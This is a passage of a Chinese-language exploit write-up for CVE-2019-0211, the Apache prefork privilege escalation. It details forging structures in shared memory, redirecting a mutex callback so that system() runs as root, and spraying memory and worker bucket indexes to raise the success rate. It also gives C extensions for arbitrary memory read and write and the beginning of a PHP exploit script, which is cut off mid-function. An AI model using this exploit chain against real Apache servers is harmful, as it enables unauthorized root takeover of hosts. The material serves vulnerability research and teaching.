<div class="codehilite"><pre><span></span><code><span class="n">prefork_child_bucket</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">ap_pod_t</span><span class="w"> </span><span class="o">*</span><span class="n">pod</span><span class="p">;</span>
<span class="w">    </span><span class="n">ap_listen_rec</span><span class="w"> </span><span class="o">*</span><span class="n">listeners</span><span class="p">;</span>
<span class="w">    </span><span class="n">apr_proc_mutex_t</span><span class="w"> </span><span class="o">*</span><span class="n">mutex</span><span class="p">;</span><span class="w"> </span><span class="o">&lt;--</span>
<span class="p">}</span>

<span class="n">apr_proc_mutex_t</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">apr_pool_t</span><span class="w"> </span><span class="o">*</span><span class="n">pool</span><span class="p">;</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">apr_proc_mutex_unix_lock_methods_t</span><span class="w"> </span><span class="o">*</span><span class="n">meth</span><span class="p">;</span><span class="w"> </span><span class="o">&lt;--</span>
<span class="w">    </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">curr_locked</span><span class="p">;</span>
<span class="w">    </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">fname</span><span class="p">;</span>

<span class="w">    </span><span class="o">...</span>
<span class="p">}</span>

<span class="n">apr_proc_mutex_unix_lock_methods_t</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">unsigned</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span>
<span class="w">    </span><span class="n">apr_status_t</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">create</span><span class="p">)(</span><span class="n">apr_proc_mutex_t</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
<span class="w">    </span><span class="n">apr_status_t</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">acquire</span><span class="p">)(</span><span class="n">apr_proc_mutex_t</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
<span class="w">    </span><span class="n">apr_status_t</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">tryacquire</span><span class="p">)(</span><span class="n">apr_proc_mutex_t</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
<span class="w">    </span><span class="n">apr_status_t</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">release</span><span class="p">)(</span><span class="n">apr_proc_mutex_t</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
<span class="w">    </span><span class="n">apr_status_t</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">cleanup</span><span class="p">)(</span><span class="nb nb-Type">void</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
<span class="w">    </span><span class="n">apr_status_t</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">child_init</span><span class="p">)(</span><span class="n">apr_proc_mutex_t</span><span class="w"> </span><span class="o">**</span><span class="p">,</span><span class="w"> </span><span class="n">apr_pool_t</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="p">);</span><span class="w"> </span><span class="o">&lt;--</span>
<span class="w">    </span><span class="n">apr_status_t</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">perms_set</span><span class="p">)(</span><span class="n">apr_proc_mutex_t</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">apr_fileperms_t</span><span class="p">,</span><span class="w"> </span><span class="n">apr_uid_t</span><span class="p">,</span><span class="w"> </span><span class="n">apr_gid_t</span><span class="p">);</span>
<span class="w">    </span><span class="n">apr_lockmech_e</span><span class="w"> </span><span class="n">mech</span><span class="p">;</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>all_buckets[0]-&gt;mutex 与 all_buckets[0]
位于同一个内存区域中（我的是第一个heap内存区域中）。apr_proc_mutex_unix_lock_methods_t是一个静态结构，位于libapr的.data，因此meth指针指向libapr中的data段中，且apr_proc_mutex_unix_lock_methods_t结构中的函数，位于libapr中的text段中。</p>
<p>由于我们可以通过/proc/self/maps来了解这些内存区域，我们可以遍历Apache内存中的每一个指针，找到一个匹配该结构的指针，这将是all_buckets
[0]。</p>
<p>注意，all_buckets的地址在每次正常重启时都会发生变化。这意味着当我们的漏洞触发时，all_buckets的地址将与我们找到的地址不同。
必须考虑到这一点; 我们稍后会解决该问题。</p>
<h4 id="prefork_child_bucket">向共享内存中写入恶意prefork_child_bucket结构<a class="headerlink" href="#prefork_child_bucket" title="Permanent link">&para;</a></h4>
<p>任意函数调用的代码路径如下</p>
<div class="codehilite"><pre><span></span><code><span class="n">bucket_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ap_scoreboard_image</span><span class="o">-&gt;</span><span class="n">parent</span><span class="o">[</span><span class="n">id</span><span class="o">]-&gt;</span><span class="n">bucket</span>
<span class="n">my_bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">all_buckets</span><span class="o">[</span><span class="n">bucket_id</span><span class="o">]</span>
<span class="n">mutex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">my_bucket</span><span class="o">-&gt;</span><span class="n">mutex</span>
<span class="n">apr_proc_mutex_child_init</span><span class="p">(</span><span class="n">mutex</span><span class="p">)</span>
<span class="p">(</span><span class="o">*</span><span class="n">mutex</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">meth</span><span class="o">-&gt;</span><span class="n">child_init</span><span class="p">(</span><span class="n">mutex</span><span class="p">,</span><span class="w"> </span><span class="n">pool</span><span class="p">,</span><span class="w"> </span><span class="n">fname</span><span class="p">)</span>
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2019-0211%29ApacheHTTP%E6%9C%8D%E5%8A%A1%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
<p>为了利用，我们使(<em>mutex)-&gt;meth-&gt;child_init指向zend_object_std_dtor(zend_object</em>
object),这产生以下链:</p>
<div class="codehilite"><pre><span></span><code><span class="n">mutex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">my_bucket</span><span class="o">-&gt;</span><span class="n">mutex</span>
<span class="p">[</span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mutex</span><span class="p">]</span>
<span class="n">zend_object_std_dtor</span><span class="p">(</span><span class="n">object</span><span class="p">)</span>
<span class="n">ht</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">object</span><span class="o">-&gt;</span><span class="n">properties</span>
<span class="n">zend_array_destroy</span><span class="p">(</span><span class="n">ht</span><span class="p">)</span>
<span class="n">zend_hash_destroy</span><span class="p">(</span><span class="n">ht</span><span class="p">)</span>
<span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ht</span><span class="o">-&gt;</span><span class="n">arData</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">val</span>
<span class="n">ht</span><span class="o">-&gt;</span><span class="n">pDestructor</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
</code></pre></div>

<p>pDestructor
使其指向system函数，&amp;ht-&gt;arData[0]-&gt;val为system函数的字符串。</p>
<p><img alt="" src="../resource/%28CVE-2019-0211%29ApacheHTTP%E6%9C%8D%E5%8A%A1%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
<p>如我们所见，两个最左边的两个结构是可以叠加的(prefork_child_bucket,zend_object结构)。</p>
<h4 id="all_buckets-bucket">使all_buckets [bucket]指向恶意构造的结构<a class="headerlink" href="#all_buckets-bucket" title="Permanent link">&para;</a></h4>
<p>由于all_buckets地址在每次优雅重启之后会改变，我们需要对其进行改进，有两种改进：喷射共享内存和使用每个process_score结构。</p>
<h5 id="_6">喷射共享内存<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h5>
<p>如果all_buckets的新地址离旧地址不远，my_bucket将会大概指向我们的结构。因此，我们可以将其全部喷射在共享内存的未使用部分上，而不是将我们的prefork_child_bucket结构放在共享内存的精确位置。但是问题是，该结构也用于作为zend_object结构，因此它的大小为（5
*
8）40个字节以包含zend_object.properties字段。在共享内存中，喷射该混合结构，对我们没有帮助。</p>
<p>为了解决该问题，我们叠加apr_proc_mutex_t和zend_array结构，并将其地址喷洒在共享内存的其余部分。影响将是prefork_child_bucket.mutex和zend_object.properties指向同一地址。
现在，如果all_bucket重新定位没有远离其原始地址，my_bucket将位于喷射区域。</p>
<p><img alt="" src="../resource/%28CVE-2019-0211%29ApacheHTTP%E6%9C%8D%E5%8A%A1%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId36.png" /></p>
<h5 id="process_score">使用每个process_score结构<a class="headerlink" href="#process_score" title="Permanent link">&para;</a></h5>
<p>每个Apache工作进程都有一个关联的process_score结构，并且每一个都有一个bucket索引。我们可以改变它们中的每一个，而不是改变一个process_score.bucket值，以使它们覆盖内存的另一部分。
例如：</p>
<div class="codehilite"><pre><span></span><code><span class="n">ap_scoreboard_image</span><span class="o">-&gt;</span><span class="n">parent</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">10000</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mh">0x7faabbcc00</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">all_buckets</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x7faabbdd00</span>
<span class="n">ap_scoreboard_image</span><span class="o">-&gt;</span><span class="n">parent</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">20000</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mh">0x7faabbdd00</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">all_buckets</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x7faabbff00</span>
<span class="n">ap_scoreboard_image</span><span class="o">-&gt;</span><span class="n">parent</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">30000</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mh">0x7faabbff00</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">all_buckets</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x7faabc0000</span>
</code></pre></div>

<p>这样一来，我们的成功率就是原始成功率乘以Apache Worker的数量。
作者通过在共享内存中查找worker
process的PID从而定位到每个process_score结构，并利用被UAF漏洞修改过的字符串结构对bucket字段值进行修改。</p>
<h4 id="_7">成功率<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
<p>不同的Apache服务具有不同数量的工作进程。
拥有更多的工作进程意味着我们可以在更少的内存上喷射互斥锁的地址，但这也意味着我们可以为all_buckets指定更多的索引。
这意味着拥有更多工作进程可以提高我们的成功率。
在测试Apache服务器上尝试了4个工作进程（默认）后，成功率大约为80％。
随着更多工作进程，成功率跃升至100％左右。</p>
<p>同样，如果漏洞利用失败，它可以在第二天重新启动，因为Apache仍将正常重启。
然而，Apache的error.log将包含有关其工作进程段错误的通知。</p>
<h4 id="php">利用PHP扩展模块体验任意函数执行<a class="headerlink" href="#php" title="Permanent link">&para;</a></h4>
<p>为了更好的理解该漏洞，我们用PHP扩展，来模拟PHP UAF，以达到任意地址读写。</p>
<h4 id="_8">环境<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
<p>操作系统:CentOS 7 x64</p>
<p>Apache版本:Apache/2.4.38 (Unix)</p>
<p>PHP版本:PHP 7.3.3</p>
<p>Apache 编译选项:</p>
<div class="codehilite"><pre><span></span><code>.<span class="o">/</span><span class="nv">configure</span><span class="w"> </span><span class="o">--</span><span class="nv">prefix</span><span class="o">=/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">local</span><span class="o">/</span><span class="nv">httpd</span><span class="o">/</span><span class="w">     </span><span class="o">--</span><span class="nv">sysconfdir</span><span class="o">=/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">httpd</span><span class="o">/</span><span class="w">     </span><span class="o">--</span><span class="nv">with</span><span class="o">-</span><span class="k">include</span><span class="o">-</span><span class="nv">apr</span><span class="w">     </span><span class="o">--</span><span class="nv">disable</span><span class="o">-</span><span class="nv">userdir</span><span class="w">     </span><span class="o">--</span><span class="nv">enable</span><span class="o">-</span><span class="nv">headers</span><span class="w">     </span><span class="o">--</span><span class="nv">with</span><span class="o">-</span><span class="nv">mpm</span><span class="o">=</span><span class="nv">prefork</span><span class="w">     </span><span class="o">--</span><span class="nv">enable</span><span class="o">-</span><span class="nv">modules</span><span class="o">=</span><span class="nv">most</span><span class="w">     </span><span class="o">--</span><span class="nv">enable</span><span class="o">-</span><span class="nv">so</span><span class="w">     </span><span class="o">--</span><span class="nv">enable</span><span class="o">-</span><span class="nv">deflate</span><span class="w">     </span><span class="o">--</span><span class="nv">enable</span><span class="o">-</span><span class="nv">defate</span><span class="o">=</span><span class="nv">shared</span><span class="w">     </span><span class="o">--</span><span class="nv">enable</span><span class="o">-</span><span class="nv">expires</span><span class="o">-</span><span class="nv">shared</span><span class="w">     </span><span class="o">--</span><span class="nv">enable</span><span class="o">-</span><span class="nv">rewrite</span><span class="o">=</span><span class="nv">shared</span><span class="w">     </span><span class="o">--</span><span class="nv">enable</span><span class="o">-</span><span class="nv">static</span><span class="o">-</span><span class="nv">support</span><span class="w">     </span><span class="o">--</span><span class="nv">with</span><span class="o">-</span><span class="nv">apr</span><span class="o">=/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">local</span><span class="o">/</span><span class="nv">apr</span><span class="o">/</span><span class="w">     </span><span class="o">--</span><span class="nv">with</span><span class="o">-</span><span class="nv">apr</span><span class="o">-</span><span class="nv">util</span><span class="o">=/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">local</span><span class="o">/</span><span class="nv">apr</span><span class="o">-</span><span class="nv">util</span><span class="o">/</span><span class="nv">bin</span><span class="w">     </span><span class="o">--</span><span class="nv">with</span><span class="o">-</span><span class="nv">ssl</span><span class="w">     </span><span class="o">--</span><span class="nv">with</span><span class="o">-</span><span class="nv">z</span>
</code></pre></div>

<p>PHP编译选项:</p>
<div class="codehilite"><pre><span></span><code><span class="p">.</span><span class="o">/</span><span class="nx">configure</span><span class="w"> </span><span class="o">--</span><span class="nx">prefix</span><span class="p">=</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">config</span><span class="o">-</span><span class="nx">file</span><span class="o">-</span><span class="nx">path</span><span class="p">=</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">apxs2</span><span class="p">=</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">httpd</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">apxs</span><span class="w"> </span><span class="err">\</span><span class="w">             </span>
<span class="o">--</span><span class="nx">enable</span><span class="o">-</span><span class="nx">fpm</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">zlib</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">libxml</span><span class="o">-</span><span class="nx">dir</span><span class="w">     </span><span class="o">--</span><span class="nx">enable</span><span class="o">-</span><span class="nx">sockets</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">curl</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">jpeg</span><span class="o">-</span><span class="nx">dir</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">png</span><span class="o">-</span><span class="nx">dir</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">gd</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">iconv</span><span class="o">-</span><span class="nx">dir</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">freetype</span><span class="o">-</span><span class="nx">dir</span><span class="w">     </span><span class="o">--</span><span class="nx">enable</span><span class="o">-</span><span class="nx">gd</span><span class="o">-</span><span class="nx">native</span><span class="o">-</span><span class="nx">ttf</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">xmlrpc</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">openssl</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">mhash</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">mcrypt</span><span class="w">     </span><span class="o">--</span><span class="nx">with</span><span class="o">-</span><span class="nx">pear</span><span class="w">     </span><span class="o">--</span><span class="nx">enable</span><span class="o">-</span><span class="nx">mbstring</span><span class="w">     </span><span class="o">--</span><span class="nx">enable</span><span class="o">-</span><span class="nx">sysvshm</span><span class="w">     </span><span class="o">--</span><span class="nx">enable</span><span class="o">-</span><span class="nx">zip</span><span class="w">     </span><span class="o">--</span><span class="nx">disable</span><span class="o">-</span><span class="nx">fileinfo</span>
</code></pre></div>

<p>PHP扩展</p>
<div class="codehilite"><pre><span></span><code><span class="p">[</span><span class="n">root</span><span class="err">@</span><span class="n">bogon</span><span class="w"> </span><span class="n">php</span><span class="o">-</span><span class="n">extension</span><span class="p">]</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">read_mem</span><span class="p">.</span><span class="n">c</span><span class="w"> </span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>

<span class="kt">long</span><span class="w"> </span><span class="n">read_mem</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)(</span><span class="n">addr</span><span class="p">)));</span>
<span class="p">}</span>
<span class="p">[</span><span class="n">root</span><span class="err">@</span><span class="n">bogon</span><span class="w"> </span><span class="n">php</span><span class="o">-</span><span class="n">extension</span><span class="p">]</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">write_mem</span><span class="p">.</span><span class="n">c</span><span class="w"> </span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>

<span class="kt">void</span><span class="w"> </span><span class="n">write_mem</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="kt">long</span><span class="w"> </span><span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="o">*</span><span class="p">((</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">[</span><span class="n">root</span><span class="err">@</span><span class="n">bogon</span><span class="w"> </span><span class="n">php</span><span class="o">-</span><span class="n">extension</span><span class="p">]</span><span class="err">#</span>
</code></pre></div>

<h4 id="_9">问题<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h4>
<p>我在Apache 2.4.38 与 Apache
2.4.25中，测试发现all_buckets的地址与共享内存的地址之间的差值，远远不是一个4字节能表示的（bucket索引4字节）。所以在我的演示中，需要通过gdb来修改</p>
<div class="codehilite"><pre><span></span><code><span class="n">my_bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">all_buckets</span><span class="o">[</span><span class="n">bucket</span><span class="o">]</span><span class="p">;</span><span class="o">//</span><span class="n">prefork</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">685</span>
</code></pre></div>

<p>my_bucket的值，来模拟修改bucket，使其指向恶意的prefork_child_bucket结构。</p>
<h4 id="php_1">PHP利用代码<a class="headerlink" href="#php_1" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">read_mem_dword</span><span class="p">(</span><span class="nv">$addr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">4</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
        <span class="nv">$ret</span> <span class="o">+=</span> <span class="nx">read_mem</span><span class="p">(</span><span class="nv">$addr</span><span class="o">+</span><span class="nv">$j</span><span class="p">)</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span><span class="nv">$j</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">read_mem_qword</span><span class="p">(</span><span class="nv">$addr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
        <span class="nv">$ret</span> <span class="o">+=</span> <span class="nx">read_mem</span><span class="p">(</span><span class="nv">$addr</span><span class="o">+</span><span class="nv">$j</span><span class="p">)</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span><span class="nv">$j</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">read_mem_byte</span><span class="p">(</span><span class="nv">$addr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="nx">read_mem</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">write_mem_qword</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
        <span class="nv">$b</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0xff</span><span class="o">&amp;</span><span class="p">((</span><span class="nv">$data</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="nv">$j</span><span class="o">*</span><span class="mi">8</span><span class="p">)));</span>
        <span class="nx">write_mem</span><span class="p">(</span><span class="nv">$addr</span><span class="o">+</span><span class="nv">$j</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">write_mem_dword</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">4</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
        <span class="nv">$b</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0xff</span><span class="o">&amp;</span><span class="p">((</span><span class="nv">$data</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="nv">$j</span><span class="o">*</span><span class="mi">8</span><span class="p">)));</span>
        <span class="nx">write_mem</span><span class="p">(</span><span class="nv">$addr</span><span class="o">+</span><span class="nv">$j</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">write_mem_byte</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nx">write_mem</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/*</span>
<span class="cm">get_mem_region:</span>

<span class="cm">str为，maps文件中的特征字符串,用于搜索指定的内存区域</span>

<span class="cm">返回值为:</span>
<span class="cm">array(2) {</span>
<span class="cm">    [0]=&gt;//第一个匹配的内存区域</span>
<span class="cm">    array(2) {</span>
<span class="cm">            [0]=&gt;</span>
<span class="cm">            int(140231115968512)//起始地址</span>
<span class="cm">            [1]=&gt;</span>
<span class="cm">        int(140231116066816)//结束地址</span>
<span class="cm">            [2]=&gt;</span>
<span class="cm">        string(4) &quot;rw-s&quot;//保护权限</span>
<span class="cm">    }</span>
<span class="cm">    [1]=&gt;//第二个匹配的内存区域</span>
<span class="cm">    array(2) {</span>
<span class="cm">        [0]=&gt;</span>
<span class="cm">        int(140231116201984)</span>
<span class="cm">        [1]=&gt;</span>
<span class="cm">        int(140231116718080)</span>
<span class="cm">            [2]=&gt;</span>
<span class="cm">        string(4) &quot;rw-s&quot;//保护权限</span>
<span class="cm">    }</span>
<span class="cm">}</span>

<span class="cm">*/</span>
<span class="k">function</span> <span class="nf">get_mem_region</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/proc/self/maps&quot;</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">);</span>
    <span class="nv">$result_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
        <span class="nv">$line</span> <span class="o">=</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="nv">$str</span><span class="p">)){</span>
            <span class="nv">$addr_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">for</span><span class="p">(;</span><span class="nv">$line</span><span class="p">[</span><span class="nv">$addr_len</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;-&#39;</span><span class="p">;</span><span class="nv">$addr_len</span><span class="o">++</span><span class="p">);</span>

            <span class="nv">$start_addr_str</span> <span class="o">=</span>  <span class="nb">substr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$addr_len</span><span class="p">);</span>
            <span class="nv">$end_addr_str</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="nv">$addr_len</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="nv">$addr_len</span><span class="p">);</span>

            <span class="nv">$result</span><span class="p">[</span><span class="nv">$result_index</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hexdec</span><span class="p">(</span><span class="nv">$start_addr_str</span><span class="p">);</span>
            <span class="nv">$result</span><span class="p">[</span><span class="nv">$result_index</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hexdec</span><span class="p">(</span><span class="nv">$end_addr_str</span><span class="p">);</span>
            <span class="nv">$result</span><span class="p">[</span><span class="nv">$result_index</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="nv">$addr_len</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
            <span class="nv">$result_index</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
